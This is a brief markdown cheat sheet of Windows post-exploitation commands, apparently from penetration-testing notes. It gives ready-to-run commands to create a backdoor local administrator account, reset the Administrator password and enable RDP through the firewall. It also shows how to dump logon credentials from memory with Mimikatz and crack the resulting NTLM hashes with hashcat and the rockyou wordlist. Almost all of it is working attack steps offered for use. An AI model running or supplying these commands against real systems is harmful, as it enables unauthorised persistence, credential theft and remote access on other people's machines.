# 08 - Windows post-exploit and AD

Index
- [Useful commands](#Useful-commands)
- [Mimikatz](#Mimikatz)

## Useful commands
Add admin user:
``` cmd
net user myuser Password1! /add 
net localgroup administrators myuser /add
```

Reset local Administrator password
``` cmd
net user Administrator Password1!
```

Enable RDP:
``` powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

## Mimikatz
Get NTML hash and crack it:
``` bash
# mimikatz command
privilege::debug
sekurlsa::logonpasswords

# hashcat cracking
hashcat -m 1000 user.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```